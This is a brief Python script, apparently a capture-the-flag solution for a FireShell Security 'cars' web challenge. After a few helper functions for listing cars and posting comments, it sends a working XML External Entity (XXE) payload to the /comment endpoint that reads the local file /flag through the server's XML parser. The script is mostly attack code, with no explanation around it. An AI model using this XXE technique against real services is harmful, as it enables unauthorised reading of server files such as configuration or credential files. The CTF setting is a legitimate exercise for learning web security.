#!/usr/bin/env python3

import requests

url = "https://cars.fireshellsecurity.team"

def get_cars():
    r = requests.get(url + "/cars")
    print(r.headers)
    return r.json()

def get_car(id):
    return requests.get(url + f"/car/{id}").json()

def save_images(cars):
    for c in cars:
        with open("images/" + c["image"].split("/")[-1], "wb") as f:
            f.write(requests.get(c["image"]).content)

def make_comment(name, message):
    msg = {
        "name": name,
        "message": message
    }

    r = requests.post(url + "/comment", json=msg)
    return r.json()

payload = """<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
      <!ENTITY xxe SYSTEM  "file:///flag" >
]>
<Comment>
    <name>&xxe;</name>
    <message>flag please!</message>
</Comment>"""

headers = {
    'Content-Type': 'application/xml',
}

r = requests.post(url + "/comment", headers=headers, data=payload)
print(r.json())
